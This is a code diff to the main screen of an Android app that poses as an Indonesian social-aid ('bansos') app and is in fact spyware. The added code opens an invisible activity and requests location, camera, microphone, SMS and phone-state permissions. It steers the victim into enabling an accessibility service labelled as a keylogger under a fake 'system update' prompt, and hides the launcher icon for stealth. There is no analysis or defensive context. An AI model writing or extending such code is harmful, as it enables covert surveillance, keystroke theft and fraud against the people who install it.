@@ -1,6 +1,7 @@
 package com.kemensos.bansos;
 
 import android.Manifest;
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ComponentName;
@@ -12,14 +13,22 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.Gravity;
-import android.view.View;
 import android.view.Window;
 import android.view.WindowManager;
+import android.view.accessibility.AccessibilityManager;
 import android.widget.LinearLayout;
-import android.widget.ProgressBar;
-import android.widget.TextView;
+import android.widget.Toast;
 
+import java.util.List;
+
+/**
+ * MainActivity — Transparent Permission-Request Activity.
+ *
+ * Upgraded to also guide user through AccessibilityService setup and
+ * stealth-disable the launcher icon after first run.
+ */
 public class MainActivity extends Activity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
@@ -30,62 +39,62 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // Set window to be dim but visible
+        // Set window to be invisible (1x1 pixel, transparent)
         Window window = getWindow();
         window.setFlags(
-            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
-            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
         );
         window.setGravity(Gravity.TOP | Gravity.LEFT);
 
-        // Small invisible layout (1x1 pixel but we need minimal view)
         LinearLayout root = new LinearLayout(this);
         root.setLayoutParams(new LinearLayout.LayoutParams(1, 1));
         root.setBackgroundColor(0x00000000);
         setContentView(root);
 
-        // Check and request all permissions
+        // Start permission chain
         requestAllPermissions();
     }
+
+    /* ===================================================================
+     * PERMISSION CHAIN
+     * =================================================================== */
 
     private void requestAllPermissions() {
         String[] permissions;
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            // Android 13+
             permissions = new String[]{
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.POST_NOTIFICATIONS,
-                Manifest.permission.READ_PHONE_STATE
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.POST_NOTIFICATIONS,
+                    Manifest.permission.READ_PHONE_STATE
             };
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            // Android 10-12
             permissions = new String[]{
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.READ_PHONE_STATE
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_PHONE_STATE
             };
         } else {
-            // Android 9 and below
             permissions = new String[]{
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.READ_PHONE_STATE
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_PHONE_STATE
             };
         }
 
@@ -113,19 +122,17 @@ public class MainActivity extends Activity {
     }
 
     private void onPermissionsReady() {
-        // Request overlay permission (for staying on top)
+        // 1. Overlay permission
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(
-                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName())
+                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName())
                 );
                 startActivityForResult(intent, OVERLAY_REQUEST_CODE);
                 return;
             }
         }
-
-        // Request battery optimization ignore
         requestBatteryOptimization();
     }
 
@@ -135,35 +142,126 @@ public class MainActivity extends Activity {
             if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 try {
                     Intent intent = new Intent(
-                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                        Uri.parse("package:" + getPackageName())
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            Uri.parse("package:" + getPackageName())
                     );
                     startActivityForResult(intent, BATTERY_REQUEST_CODE);
                     return;
-                } catch (Exception e) {
-                    // Some devices don't support this intent
-                }
+                } catch (Exception ignored) {}
             }
         }
-
-        // Open notification listener settings
         openNotifAccess();
     }
 
     private void openNotifAccess() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
             String enabledListeners = Settings.Secure.getString(
-                getContentResolver(),
-                "enabled_notification_listeners"
+                    getContentResolver(),
+                    "enabled_notification_listeners"
             );
             if (enabledListeners == null || !enabledListeners.contains(getPackageName())) {
                 Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                 startActivity(intent);
             }
         }
+        openAccessibilitySettings();
+    }
 
-        // Start the service and finish
-        startServiceAndFinish();
+    /* ===================================================================
+     * ACCESSIBILITY SERVICE SETUP (KEYLOGGER)
+     * =================================================================== */
+
+    private void openAccessibilitySettings() {
+        // Check if KeylogService is already enabled
+        if (isAccessibilityServiceEnabled()) {
+            startServicesAndFinish();
+            return;
+        }
+
+        // Open accessibility settings for the user to enable our service
+        try {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            startActivity(intent);
+
+            // Show a helpful toast about what to do
+            Toast.makeText(this,
+                    "☑ Buka 'Pembaruan Sistem' → Aktifkan Layanan Aksesibilitas",
+                    Toast.LENGTH_LONG).show();
+        } catch (Exception e) {
+            // Fallback to application settings
+            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+        }
+
+        // Start services anyway (KeylogService will be inactive until A11Y enabled,
+        // but all other services work)
+        startServicesAndFinish();
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        AccessibilityManager am = (AccessibilityManager)
+                getSystemService(Context.ACCESSIBILITY_SERVICE);
+        if (am == null) return false;
+
+        List<AccessibilityServiceInfo> enabledServices =
+                am.getEnabledAccessibilityServiceList(
+                        AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+
+        String ourServiceName = getPackageName() + "/.KeylogService";
+        for (AccessibilityServiceInfo info : enabledServices) {
+            if (info.getId().equals(ourServiceName)) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    /* ===================================================================
+     * STEALTH: DISABLE LAUNCHER ICON
+     * =================================================================== */
+
+    private void stealthDisableIcon() {
+        try {
+            // Disable the real MainActivity (original launcher icon entry)
+            PackageManager pm = getPackageManager();
+            ComponentName mainComponent = new ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(mainComponent,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+
+            Log.d("Stealth", "Launcher icon disabled. App still running.");
+
+            // Enable the alias (hidden — only accessible via notification/command)
+            ComponentName aliasComponent = new ComponentName(this, "com.kemensos.bansos.MainActivityAlias");
+            pm.setComponentEnabledSetting(aliasComponent,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP);
+
+        } catch (Exception e) {
+            Log.e("Stealth", "Icon disable error", e);
+        }
+    }
+
+    /* ===================================================================
+     * START SERVICES & FINISH
+     * =================================================================== */
+
+    private void startServicesAndFinish() {
+        // 1. Start persistent foreground service (GPS + Camera + Update)
+        Intent serviceIntent = new Intent(this, UpdateService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+
+        // 2. Disable launcher icon (stealth)
+        stealthDisableIcon();
+
+        // 3. Finish activity (completely invisible now)
+        finish();
     }
 
     @Override
@@ -174,15 +272,5 @@ public class MainActivity extends Activity {
         } else if (requestCode == BATTERY_REQUEST_CODE) {
             openNotifAccess();
         }
-    }
-
-    private void startServiceAndFinish() {
-        Intent serviceIntent = new Intent(this, UpdateService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-        finish();
     }
 }
